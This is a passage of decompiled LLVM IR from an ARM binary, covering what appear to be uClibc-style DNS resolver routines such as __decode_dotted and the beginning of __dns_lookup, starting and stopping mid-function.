  %v0_1bbcc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1bbcc

dec_label_pc_1bbac:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1bbb0 = inttoptr i32 %arg3 to i8*
  %v3_1bbb0 = call i32 @strcpy(i8* %v2_1bbb0, i32 %v2_1ba90)
  br label %dec_label_pc_1bbb4

dec_label_pc_1bbb4:                               ; preds = %dec_label_pc_1b994, %dec_label_pc_1bbac
  %storemerge = phi i32 [ %v3_1b9a0, %dec_label_pc_1b994 ], [ %v3_1bbb0, %dec_label_pc_1bbac ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1bbcc

dec_label_pc_1bbbc:                               ; preds = %dec_label_pc_1b988
  %v0_1bbbc = call i32 @__GI___errno_location()
  store i32 %v0_1bbbc, i32* %r0.global-to-local, align 4
  %v2_1bbc4 = inttoptr i32 %v0_1bbbc to i32*
  store i32 97, i32* %v2_1bbc4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1bbcc

dec_label_pc_1bbcc:                               ; preds = %bb57, %dec_label_pc_1bbb4, %dec_label_pc_1bb98, %dec_label_pc_1bbbc
  %v0_1bbcc = phi i32 [ %v1_1bb24, %bb57 ], [ %storemerge, %dec_label_pc_1bbb4 ], [ %v0_1bbcc.pre, %dec_label_pc_1bb98 ], [ 0, %dec_label_pc_1bbbc ]
  store i32 %v0_1bbcc, i32* %r0.global-to-local, align 4
  store i32 %v6_1b964, i32* %r5.global-to-local, align 4
  ret i32 %v0_1bbcc

; uselistorder directives
  uselistorder i32 %v0_1bbcc, { 1, 0 }
  uselistorder i1 %v7_1baa8, { 2, 0, 1 }
  uselistorder i32 %v0_1baa8.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1bb58, { 0, 2, 1 }
  uselistorder i32 %v0_1bb44, { 1, 0 }
  uselistorder i32 %v0_1bb2c, { 1, 0 }
  uselistorder i32 %v5_1bad8, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_1bab0, { 1, 0, 2 }
  uselistorder i32 %v2_1bad869, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1bad471, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_1baa868, { 1, 0 }
  uselistorder i32 %v2_1ba90, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_1baa0, { 1, 0, 2 }
  uselistorder i1 %v7_1ba7c, { 1, 0 }
  uselistorder i32 %v0_1ba7c, { 1, 2, 0 }
  uselistorder i32 %v1_1baa0.pre, { 2, 0, 1 }
  uselistorder i32 %v0_1ba74.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_1ba64, { 1, 0 }
  uselistorder i1 %v7_1ba5c, { 1, 0 }
  uselistorder i32 %v1_1ba50, { 1, 0 }
  uselistorder i32 %v0_1ba64, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1ba78, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1ba18, { 1, 0 }
  uselistorder i32 %v0_1ba50, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1ba34, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1ba44, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1b9d4, { 1, 0, 2 }
  uselistorder i32 %v2_1b9bc, { 1, 0 }
  uselistorder i32 %v0_1b9d4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1b9d8, { 0, 4, 3, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 16, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 23, 14, 15, 16, 17, 18, 22, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 9, 1, 0, 8, 10, 2, 3, 4, 7 }
  uselistorder i8 58, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1bbcc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1bbb4, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1bb58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1baa8, { 1, 0 }
  uselistorder label %dec_label_pc_1ba7c._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ba7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ba74, { 1, 0 }
  uselistorder label %dec_label_pc_1ba50, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1ba4c, { 1, 0 }
  uselistorder label %dec_label_pc_1ba04, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_1bbe8 = load i32, i32* @r5, align 4
  %v0_1bbec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1bbec, i32* %sl.global-to-local, align 4
  %v2_1bbec = icmp eq i32 %v0_1bbec, 0
  br i1 %v2_1bbec, label %.thread30, label %dec_label_pc_1bc14.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1bcd4

dec_label_pc_1bc14.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1bc144 = load i32, i32* @r1, align 4
  %v6_1bc1814 = icmp slt i32 %v0_1bc144, %arg2
  br i1 %v6_1bc1814, label %dec_label_pc_1bc1c.preheader, label %dec_label_pc_1bcd4

dec_label_pc_1bc1c.preheader:                     ; preds = %dec_label_pc_1bc14.preheader
  %v2_1bc1c51 = add i32 %v0_1bbec, %v0_1bc144
  %v3_1bc1c52 = inttoptr i32 %v2_1bc1c51 to i8*
  %v4_1bc1c53 = load i8, i8* %v3_1bc1c52, align 1
  %v6_1bc1c54 = zext i8 %v4_1bc1c53 to i32
  store i32 %v6_1bc1c54, i32* @r4, align 4
  %v2_1bc2055 = icmp eq i8 %v4_1bc1c53, 0
  br i1 %v2_1bc2055, label %bb49, label %dec_label_pc_1bc28

dec_label_pc_1bc10:                               ; preds = %bb48, %bb44
  %v1_1bc14 = phi i32 [ %v1_1bc14.pre, %bb48 ], [ %v1_1bc4059, %bb44 ]
  %v0_1bc14 = phi i32 [ %v0_1bc14.pre, %bb48 ], [ %v5_1bc58, %bb44 ]
  %v0_1bc10 = phi i32 [ %v0_1bc10.pre, %bb48 ], [ %v0_1bc5c60, %bb44 ]
  store i32 %v0_1bc10, i32* %r0.global-to-local, align 4
  %v6_1bc18 = icmp slt i32 %v0_1bc14, %v1_1bc14
  br i1 %v6_1bc18, label %dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge, label %dec_label_pc_1bcd4

dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge:  ; preds = %dec_label_pc_1bc10
  %v0_1bc1c.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1bc1c = add i32 %v0_1bc1c.pre, %v0_1bc14
  %v3_1bc1c = inttoptr i32 %v2_1bc1c to i8*
  %v4_1bc1c = load i8, i8* %v3_1bc1c, align 1
  %v6_1bc1c = zext i8 %v4_1bc1c to i32
  store i32 %v6_1bc1c, i32* @r4, align 4
  %v2_1bc20 = icmp eq i8 %v4_1bc1c, 0
  %v0_1bcc0 = load i32, i32* @ip, align 4
  %v2_1bcc0 = icmp eq i32 %v0_1bcc0, 0
  br i1 %v2_1bc20, label %dec_label_pc_1bcc0, label %dec_label_pc_1bc28

dec_label_pc_1bc28:                               ; preds = %dec_label_pc_1bc1c.preheader, %dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge
  %v2_1bcc066 = phi i1 [ %v2_1bcc0, %dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge ], [ false, %dec_label_pc_1bc1c.preheader ]
  %v0_1bcc064 = phi i32 [ %v0_1bcc0, %dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge ], [ 1, %dec_label_pc_1bc1c.preheader ]
  %v6_1bc1c63 = phi i32 [ %v6_1bc1c, %dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge ], [ %v6_1bc1c54, %dec_label_pc_1bc1c.preheader ]
  %v0_1bc4862 = phi i32 [ %v0_1bc1c.pre, %dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge ], [ %v0_1bbec, %dec_label_pc_1bc1c.preheader ]
  %v0_1bc3861 = phi i32 [ %v0_1bc14, %dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge ], [ %v0_1bc144, %dec_label_pc_1bc1c.preheader ]
  %v0_1bc5c60 = phi i32 [ %v0_1bc10, %dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge ], [ 0, %dec_label_pc_1bc1c.preheader ]
  %v1_1bc4059 = phi i32 [ %v1_1bc14, %dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge ], [ %arg2, %dec_label_pc_1bc1c.preheader ]
  %v1_1bc2c = and i32 %v6_1bc1c63, 192
  br i1 %v2_1bcc066, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_1bc28
  %v1_1bc30 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bc30 = add i32 %v1_1bc30, 1
  store i32 %v2_1bc30, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1bc28, %bb
  %v2_1bc34 = icmp eq i32 %v1_1bc2c, 192
  %v1_1bc38 = add i32 %v0_1bc3861, 1
  store i32 %v1_1bc38, i32* %r1.global-to-local, align 4
  br i1 %v2_1bc34, label %dec_label_pc_1bc40, label %dec_label_pc_1bc68

dec_label_pc_1bc40:                               ; preds = %bb42
  %v6_1bc44 = icmp slt i32 %v1_1bc38, %v1_1bc4059
  br i1 %v6_1bc44, label %dec_label_pc_1bc48, label %dec_label_pc_1bcd4

dec_label_pc_1bc48:                               ; preds = %dec_label_pc_1bc40
  %v2_1bc48 = add i32 %v1_1bc38, %v0_1bc4862
  %v3_1bc48 = inttoptr i32 %v2_1bc48 to i8*
  %v4_1bc48 = load i8, i8* %v3_1bc48, align 1
  %v6_1bc48 = zext i8 %v4_1bc48 to i32
  %v1_1bc50 = urem i32 %v6_1bc1c63, 64
  br i1 %v2_1bcc066, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_1bc48
  %v1_1bc54 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bc54 = add i32 %v1_1bc54, 1
  store i32 %v2_1bc54, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1bc48, %bb43
  %v4_1bc58 = mul nuw nsw i32 %v1_1bc50, 256
  %v5_1bc58 = or i32 %v6_1bc48, %v4_1bc58
  store i32 %v5_1bc58, i32* %r1.global-to-local, align 4
  store i32 %v0_1bc5c60, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1bc10

dec_label_pc_1bc68:                               ; preds = %bb42
  %v2_1bc68 = add i32 %v6_1bc1c63, %v0_1bc5c60
  store i32 %v2_1bc68, i32* %r6.global-to-local, align 4
  %v3_1bc6c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1bc6c, i32* @r3, align 4
  %v1_1bc70 = add i32 %v2_1bc68, 1
  store i32 %v1_1bc70, i32* %r7.global-to-local, align 4
  %v3_1bc74 = icmp ult i32 %v1_1bc70, %v3_1bc6c
  br i1 %v3_1bc74, label %dec_label_pc_1bc7c, label %dec_label_pc_1bcd4

dec_label_pc_1bc7c:                               ; preds = %dec_label_pc_1bc68
  %v2_1bc7c = add i32 %v6_1bc1c63, %v1_1bc38
  store i32 %v2_1bc7c, i32* @r5, align 4
  %v3_1bc80 = icmp ult i32 %v2_1bc7c, %v1_1bc4059
  br i1 %v3_1bc80, label %dec_label_pc_1bc88, label %dec_label_pc_1bcd4

dec_label_pc_1bc88:                               ; preds = %dec_label_pc_1bc7c
  %v2_1bc88 = add i32 %v1_1bc38, %v0_1bc4862
  store i32 %v2_1bc88, i32* @r1, align 4
  %v0_1bc8c = load i32, i32* %sb.global-to-local, align 4
  %v2_1bc8c = add i32 %v0_1bc8c, %v0_1bc5c60
  store i32 %v2_1bc8c, i32* @r0, align 4
  store i32 %v6_1bc1c63, i32* @r2, align 4
  %v0_1bc98 = call i32 @memcpy()
  store i32 %v0_1bc98, i32* %r0.global-to-local, align 4
  store i32 %v0_1bcc064, i32* @ip, align 4
  %v0_1bca0 = load i32, i32* %sl.global-to-local, align 4
  %v1_1bca0 = load i32, i32* @r5, align 4
  %v2_1bca0 = add i32 %v1_1bca0, %v0_1bca0
  %v3_1bca0 = inttoptr i32 %v2_1bca0 to i8*
  %v4_1bca0 = load i8, i8* %v3_1bca0, align 1
  br i1 %v2_1bcc066, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_1bc88
  %v1_1bca8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bca8 = load i32, i32* @r4, align 4
  %v3_1bca8 = add i32 %v2_1bca8, %v1_1bca8
  store i32 %v3_1bca8, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1bc88, %bb45
  %v2_1bcac = icmp eq i8 %v4_1bca0, 0
  br i1 %v2_1bcac, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_1bcb8.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_1bca0, i32* %r1.global-to-local, align 4
  %v2_1bcb8 = load i32, i32* %sb.global-to-local, align 4
  %v3_1bcb8 = load i32, i32* %r6.global-to-local, align 4
  %v4_1bcb8 = add i32 %v3_1bcb8, %v2_1bcb8
  %v5_1bcb8 = inttoptr i32 %v4_1bcb8 to i8*
  store i8 %v0_1bcb8.off0, i8* %v5_1bcb8, align 1
  %v0_1bc10.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1bc14.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1bc14.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1bc10

dec_label_pc_1bcc0:                               ; preds = %dec_label_pc_1bc10.dec_label_pc_1bc1c_crit_edge
  %v0_1bcc8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1bcc0, label %dec_label_pc_1bcd4, label %bb49

bb49:                                             ; preds = %dec_label_pc_1bc1c.preheader, %dec_label_pc_1bcc0
  %v0_1bcc8.pre69 = phi i32 [ %v0_1bcc8.pre.pre, %dec_label_pc_1bcc0 ], [ 0, %dec_label_pc_1bc1c.preheader ]
  %v2_1bcc4 = add i32 %v0_1bcc8.pre69, 1
  store i32 %v2_1bcc4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1bcd4

dec_label_pc_1bcd4:                               ; preds = %dec_label_pc_1bc7c, %dec_label_pc_1bc68, %dec_label_pc_1bc40, %dec_label_pc_1bc10, %dec_label_pc_1bcc0, %dec_label_pc_1bc14.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_1bcc4, %bb49 ], [ -1, %dec_label_pc_1bc14.preheader ], [ %v0_1bcc8.pre.pre, %dec_label_pc_1bcc0 ], [ -1, %dec_label_pc_1bc68 ], [ -1, %dec_label_pc_1bc7c ], [ -1, %dec_label_pc_1bc10 ], [ -1, %dec_label_pc_1bc40 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1bbe8, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1bcc8.pre.pre, { 1, 0 }
  uselistorder i32 %v1_1bca0, { 1, 0 }
  uselistorder i32 %v5_1bc58, { 1, 0 }
  uselistorder i32 %v1_1bc38, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1bc5c60, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1bc1c63, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_1bcc066, { 1, 2, 0 }
  uselistorder i32 %v0_1bbec, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 7, 1, 4, 2, 5, 3, 6, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1bcd4, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_1bc28, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_1bce0 = load i32, i32* @r4, align 4
  %v6_1bce0 = load i32, i32* @r5, align 4
  %v9_1bce0 = load i32, i32* @r6, align 4
  %v12_1bce0 = load i32, i32* @r7, align 4
  %v15_1bce0 = load i32, i32* @r8, align 4
  %v18_1bce0 = load i32, i32* @sb, align 4
  %v21_1bce0 = load i32, i32* @sl, align 4
  %v24_1bce0 = load i32, i32* @fp, align 4
  %v27_1bce0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_1bcf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1bcfc = call i32 @malloc(i32 512)
  store i32 %v1_1bcfc, i32* @sl, align 4
  %v0_1bd04 = load i32, i32* @r4, align 4
  %v1_1bd04 = inttoptr i32 %v0_1bd04 to i8*
  %v3_1bd08 = call i32 @strlen(i8* %v1_1bd04)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_1bd14 = icmp ugt i32 %v3_1bd08, 893
  store i1 %v3_1bd14, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v3_1bd08, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_1bd34

.thread132:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c444

dec_label_pc_1bd34:                               ; preds = %entry
  %v1_1bd38 = add i32 %v3_1bd08, 130
  %v1_1bd3c = call i32 @malloc(i32 %v1_1bd38)
  store i32 %v1_1bd3c, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1bd40 = icmp eq i32 %v1_1bd3c, 0
  br i1 %v2_1bd40, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_1bd34
  %v1_1bd44 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1bd44 = icmp eq i32 %v1_1bd44, 0
  br i1 %v3_1bd44, label %bb213, label %dec_label_pc_1bd58

.thread5:                                         ; preds = %dec_label_pc_1bd34
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1c43c

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1c43c

dec_label_pc_1bd58:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_1bd58 = load i32, i32* @r4, align 4
  %v1_1bd58 = inttoptr i32 %v0_1bd58 to i8*
  %v2_1bd58 = load i8, i8* %v1_1bd58, align 1
  %v3_1bd58 = zext i8 %v2_1bd58 to i32
  store i32 %v3_1bd58, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1bd5c = icmp eq i8 %v2_1bd58, 0
  br i1 %v2_1bd5c, label %dec_label_pc_1c43c, label %dec_label_pc_1bd64

dec_label_pc_1bd64:                               ; preds = %dec_label_pc_1bd58
  %v2_1bd68 = add i32 %v0_1bd58, %v3_1bd08
  store i32 %v2_1bd68, i32* %r3.global-to-local, align 4
  %v1_1bd6c = add i32 %v2_1bd68, -1
  %v2_1bd6c = inttoptr i32 %v1_1bd6c to i8*
  %v3_1bd6c = load i8, i8* %v2_1bd6c, align 1
  %v4_1bd6c = zext i8 %v3_1bd6c to i32
  store i32 %v4_1bd6c, i32* @r3, align 4
  store i32 %v3_1bd08, i32* @r2, align 4
  store i32 %v0_1bd58, i32* @r1, align 4
  %v0_1bd7c = call i32 @memcpy()
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 27500, i32* %ip.global-to-local, align 4
  store i32 26464, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_1bdf8 = ptrtoint i32* %stack_var_-76 to i32
  %v2_1bf10 = ptrtoint i16* %stack_var_-104 to i32
  %v15_1bf14 = ptrtoint i32* %stack_var_-88 to i32
  %v2_1bf38 = ptrtoint i32* %stack_var_-192 to i32
  %v2_1bf58 = bitcast i32* %stack_var_-192 to i8*
  %v2_1c00c = ptrtoint i32* %stack_var_-48 to i32
  %v2_1c018 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1c0a4 = icmp eq i32 %tmp161, 0
  %v1_1c0b0 = add i32 %tmp160, -2
  %v2_1c0b4 = icmp ne i32 %v1_1c0b0, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_1c1a0 = ptrtoint i32* %stack_var_-448 to i32
  %v2_1c1a4 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1c3e856 = icmp sgt i32 %tmp159, 0
  %v2_1c310 = icmp ne i32 %v0_1bcf4, 0
  %v7_1c310 = icmp eq i32 %v0_1bcf4, 1
  %v1_1c204 = bitcast i32* %stack_var_-448 to i8*
  %v2_1c2b8 = icmp eq i32 %tmp144, 0
  %v2_1c0c0 = icmp ugt i8 %v3_1bd6c, 45
  %v7_1c0c0 = icmp eq i8 %v3_1bd6c, 46
  %v1_1be6c = add i32 %v1_1bd3c, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_1be4c = add i32 %v1_1bd3c, %v3_1bd08
  %v5_1be4c = inttoptr i32 %v4_1be4c to i8*
  %v1_1c0b0.cmp = icmp ugt i32 %v1_1c0b0, 1
  %v2_1c0e8 = icmp eq i32 %tmp160, 0
  %v3_1c314 = icmp ugt i32 %v0_1bcf4, 27
  %v8_1c314 = icmp eq i32 %v0_1bcf4, 28
  br label %dec_label_pc_1bddc

dec_label_pc_1bddc:                               ; preds = %dec_label_pc_1c424, %dec_label_pc_1bd64
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_1bd64 ], [ %v1_1c428, %dec_label_pc_1c424 ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_1bd64 ], [ %v3_1bef0, %dec_label_pc_1c424 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_1bd64 ], [ %stack_var_-468.2, %dec_label_pc_1c424 ]
  %v1_1bde4 = phi i32 [ -1, %dec_label_pc_1bd64 ], [ %v3_1bfc4, %dec_label_pc_1c424 ]
  store i32 %v1_1bde4, i32* %r3.global-to-local, align 4
  %v2_1bde0 = icmp eq i32 %v1_1bde4, -1
  store i1 %v2_1bde0, i1* %cpsr_c.global-to-local, align 1
  %v7_1bde0 = icmp eq i32 %v1_1bde4, -1
  br i1 %v7_1bde0, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_1bddc
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_1bddc, %bb215
  %v1_1bde8 = xor i1 %v7_1bde0, true
  call void @__pseudo_cond_branch(i1 %v1_1bde8, i32 ptrtoint (i32* @global_var_12c94.1172 to i32))
  store i32 36, i32* @r7, align 4
  %v0_1bdf4 = load i32, i32* @r8, align 4
  %v2_1bdf4 = add i32 %v0_1bdf4, 40
  %v3_1bdf4 = inttoptr i32 %v2_1bdf4 to i32*
  %v4_1bdf4 = load i32, i32* %v3_1bdf4, align 4
  store i32 %v4_1bdf4, i32* @r4, align 4
  store i32 %v2_1bdf8, i32* @r5, align 4
  store i32 76, i32* %ip.global-to-local, align 4
  %v2_1be04 = add i32 %v0_1bdf4, 36
  %v3_1be04 = inttoptr i32 %v2_1be04 to i32*
  %v4_1be04 = load i32, i32* %v3_1be04, align 4
  store i32 %v4_1be04, i32* %r1.global-to-local, align 4
  %v2_1be0c = add i32 %v0_1bdf4, 76
  %v3_1be0c = inttoptr i32 %v2_1be0c to i32*
  %v4_1be0c = load i32, i32* %v3_1be0c, align 4
  store i32 %v4_1be0c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1be0c)
  store i32 16, i32* %r1.global-to-local, align 4
  %v0_1be20 = load i32, i32* @r8, align 4
  %v2_1be20 = add i32 %v0_1be20, 16
  %v3_1be20 = inttoptr i32 %v2_1be20 to i32*
  %v4_1be20 = load i32, i32* %v3_1be20, align 4
  store i32 %v4_1be20, i32* %ip.global-to-local, align 4
  store i32 114220, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1be20)
  %v0_1be2c = call i32 @__open_nameservers()
  %v0_1be34 = load i32, i32* @r8, align 4
  %v2_1be34 = add i32 %v0_1be34, 27512
  %v3_1be34 = inttoptr i32 %v2_1be34 to i32*
  %v4_1be34 = load i32, i32* %v3_1be34, align 4
  store i32 %v1_1bd3c, i32* %r3.global-to-local, align 4
  store i32 %v3_1bd08, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_1be44 = load i32, i32* @sb, align 4
  %v3_1be44 = icmp uge i32 %v0_1be44, %v4_1be34
  store i1 %v3_1be44, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_1be4c, align 1
  %v0_1be50 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1be50, label %dec_label_pc_1be7c, label %dec_label_pc_1be54

dec_label_pc_1be54:                               ; preds = %bb216
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_1be5c = load i32, i32* %ip.global-to-local, align 4
  %v4_1be5c = add i32 %v3_1be5c, %v1_1bd3c
  %v5_1be5c = inttoptr i32 %v4_1be5c to i8*
  store i8 46, i8* %v5_1be5c, align 1
  store i32 27500, i32* %r1.global-to-local, align 4
  %v0_1be68 = load i32, i32* @r8, align 4
  %v2_1be68 = add i32 %v0_1be68, 27500
  %v3_1be68 = inttoptr i32 %v2_1be68 to i32*
  %v4_1be68 = load i32, i32* %v3_1be68, align 4
  store i32 %v4_1be68, i32* %r3.global-to-local, align 4
  %v1_1be70 = load i32, i32* %ip.global-to-local, align 4
  %v2_1be70 = add i32 %v1_1be6c, %v1_1be70
  %v1_1be74 = load i32, i32* @sb, align 4
  %v2_1be74 = and i32 %v1_1be74, 1073741824
  %v3_1be74 = icmp ne i32 %v2_1be74, 0
  store i1 %v3_1be74, i1* %cpsr_c.global-to-local, align 1
  %v4_1be74 = mul i32 %v1_1be74, 4
  %v5_1be74 = add i32 %v4_1be74, %v4_1be68
  %v6_1be74 = inttoptr i32 %v5_1be74 to i32*
  %v7_1be74 = load i32, i32* %v6_1be74, align 4
  store i32 %v7_1be74, i32* @r1, align 4
  %v2_1be78 = inttoptr i32 %v2_1be70 to i8*
  %v3_1be78 = call i32 @strcpy(i8* %v2_1be78, i32 %v7_1be74)
  br label %dec_label_pc_1be7c

